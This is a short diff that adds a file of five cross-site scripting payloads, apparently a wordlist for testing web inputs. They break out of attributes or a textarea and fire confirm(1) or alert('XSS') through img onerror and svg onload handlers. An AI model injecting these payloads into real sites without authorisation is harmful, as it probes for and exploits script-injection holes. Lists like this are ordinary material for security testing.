@@ -1,0 +1,5 @@
+<img src=x onerror=confirm(1)>
+"><img src=x onerror=confirm(1)>
+"><svg/onload=confirm(1)>
+"/><svg/onload=confirm(1)>
+</textarea><svg/onload=alert('XSS')>
